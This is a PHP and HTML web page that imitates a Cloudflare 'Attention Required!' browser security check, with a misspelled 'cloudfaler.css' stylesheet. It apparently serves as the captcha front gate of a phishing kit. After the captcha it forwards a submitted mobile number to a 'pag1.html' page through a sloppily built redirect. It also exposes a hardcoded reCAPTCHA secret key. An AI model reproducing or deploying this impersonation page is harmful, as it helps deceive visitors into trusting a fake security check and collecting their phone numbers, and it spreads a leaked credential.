<?php

$pnumber = "";
$siteKey = "6LcndPcqAAAAAO5Wl-U4zBaWg4H_zKwpgKHsQ8y-";
$secretKey = "6LcndPcqAAAAAOcBeGrwdNkHTi6PncNQxAeSIxGR";
$msg = "";
if (isset($_POST["submit"])) {
    $pnumber = $_POST["mobile"];
    $recaptchaResponse = $_POST["g-recaptcha-response"];
    $userIp = $_SERVER["REMOTE_ADDR"];
    $request = "https://www.google.com/recaptcha/api/siteverify?secret={$secretKey}&response={$recaptchaResponse}&remoteip={$userIp}";
    $content = file_get_contents($request);
    $json = json_decode($content);
    if ($json->success == "true") {
        $mobi = $_POST['mobile'];
        header('Location: pag1.html' . $mobi);
    } else {
        $msg = "Invalid Captcha. Try Again";
    }
}

?>


<html class="no-js" xmlns="http://www.w3.org/1999/html" lang="en-US">

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Attention Required!</title>
    <meta name="robots" content="noindex, nofollow">

    <link rel="stylesheet" href="assets/css/cloudfaler.css" type="text/css" media="screen,projection">

</head>

<body>



    <div id="content">
        <div id="wrapper">
            <div id="error-details" class="error-details-wrapper">
                <div class="wrapper header error-overview">
                    <h1>One more step
                    </h1>
                    <h2 class="subheadline">
                        <span>Please complete the security check to access ram website.</span>
                    </h2>
                </div>
                <div class="section highlight captcha-container">
                    <div class="wrapper">
                        <div class="columns two">
                            <div class="column">
                                <div class="highlight-inverse form-stacked" style="display: flex;justify-content: center;">
                                    <form id="captchabox" method="POST" action="">
                                        <div id="please-wait" style="display: none;">
                                            <div id="spinner">
                                                <div id="bubbles">
                                                    <div class="bubbles">
                                                    </div>
                                                    <div class="bubbles">
                                                    </div>
                                                    <div class="bubbles">
                                                    </div>
                                                </div>
                                            </div>
                                            <p id="spinner-please-wait">Please stand by, while we are checking your browser...</p>
                                        </div>
                                        <div class="next text-center">


                                            <div class="form-group">
                                                <center>
                                                    <div class="g-recaptcha" data-sitekey="6LecOOApAAAAAHtpA_i4oHsWiHMRE4PaGQ-4ut7M"></div>
                                                </center>

                                            </div>

                                            <button name="submit" type="submit" class="btn btn-primary btn-lg" style="width: 300px;height: 55px;margin-top:30px;" id="btn">Continue</button>


                                        </div>
                                    </form>
                                </div>
                            </div>
                            <div class="column">
                                <div class="screenshot-container">
                                    <span class="no-screenshot">
                                    </span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="section wrapper">
                    <div class="columns two">
                        <div class="column">
                            <h2>Why do I have to complete a CAPTCHA?
                            </h2>
                            <p>Completing the CAPTCHA proves you are a human and gives you temporary access to the web property.
                            </p>
                        </div>
                        <div class="column">
                            <h2>What can I do to prevent this in the future?
                            </h2>
                            <p>If you are on a personal connection, like at
                                home, you can run an anti-virus scan on your device to make sure it is
                                not infected with malware.
                            </p>
                            <p>If you are at an office or shared network,
                                you can ask the network administrator to run a scan across the network
                                looking for misconfigured or infected devices.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>
    <div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
        <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div>
        <div style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;" class="g-recaptcha-bubble-arrow"></div>
        <div style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;" class="g-recaptcha-bubble-arrow"></div>
        <div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge expires in two minutes" src="Attention%20Required!_files/bframe.htm" style="width: 100%; height: 100%;" name="c-qg43hmpln7oo" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" frameborder="0"></iframe></div>
    </div>
</body>

</html>